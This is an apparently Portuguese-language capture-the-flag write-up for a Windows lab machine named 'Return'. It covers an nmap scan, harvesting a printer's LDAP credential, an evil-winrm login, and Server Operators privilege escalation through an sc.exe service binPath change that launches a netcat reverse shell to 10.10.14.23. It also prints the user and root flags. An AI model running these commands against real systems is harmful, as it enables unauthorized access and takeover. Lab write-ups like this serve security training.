# Return Writeup

## Scan e Enum

```
# Nmap 7.92 scan initiated Mon Dec 27 10:57:19 2021 as: nmap -sV -Pn -v -oN scan.txt 10.129.222.183
Nmap scan report for 10.129.222.183
Host is up (0.24s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-27 16:16:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 27 10:57:42 2021 -- 1 IP address (1 host up) scanned in 22.72 seconds
```

Tendo feito o scan, podemos ver que o host possui um servidor web que possui um arquivo de settings de uma impressora. Essa página no permite mudar o host, com isso podemos colocar nosso ip no server e receber uma mensagem na porta 389, queseria a senha do usuário. Para mais detalhes ver esse artigo --> https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856

Tendo a conta em mãos podemos logar no evil-winrm com o seguinte comando: ```evil-winrm -i 10.129.222.183 -u svc-printer -p '1edFg43012!!'```

Tendo logado no evil-winrm podemos pegar a flag de user.

* User Flag

```
cd C:\Users\svc-printer\Desktop
type user.txt
e096181af1c7f121d0db2efd615ca1a0
```

Tendo pego a flag de user, podemos fazer a enumeração para escalarmos para root.
Após enumerar um pouco, podemos ver que o nosso usuário está no grupo de "Server Operators", o que nos permite fazer alterar o path de um arquivo que esteja executando com permissões administrativas, pará-lo e xecutar ele novamente, para que assim possamos pegar shell reversa. Para mais detalher ver o artigo --> https://cube0x0.github.io/Pocing-Beyond-DA/

Comandos:

```
sc.exe config vss binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.23 1234"
sc.exe vss stop
sc.exe vss start
```

Ao receber a conexão reversa, podemos pegar a flag de root

```
cd C:\Users\Administrator\Desktop
type root.txt
46d3cf5c5eac898b2bb1de896a63dc10
```
